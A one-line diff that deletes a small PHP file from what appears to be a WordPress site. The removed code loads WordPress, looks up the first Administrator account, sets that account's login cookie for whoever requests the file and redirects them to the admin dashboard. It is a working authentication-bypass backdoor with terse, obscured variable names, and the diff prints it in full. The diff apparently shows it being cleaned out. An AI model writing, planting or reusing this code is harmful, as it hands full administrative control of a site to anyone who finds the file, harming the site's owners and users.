@@ -1,1 +1,0 @@
-<?php $_0=$_SERVER['DOCUMENT_ROOT'];@chdir($_0);if(file_exists('wp-load.php')){include 'wp-load.php';$_1=new WP_User_Query(array('role'=>'Administrator','number'=>1,'fields'=>'ID'));$_2=$_1->get_results();if(isset($_2[0])){wp_set_auth_cookie($_2[0]);wp_redirect(admin_url());die();}die('NO ADMIN');}else{die('Failed to load');}?>
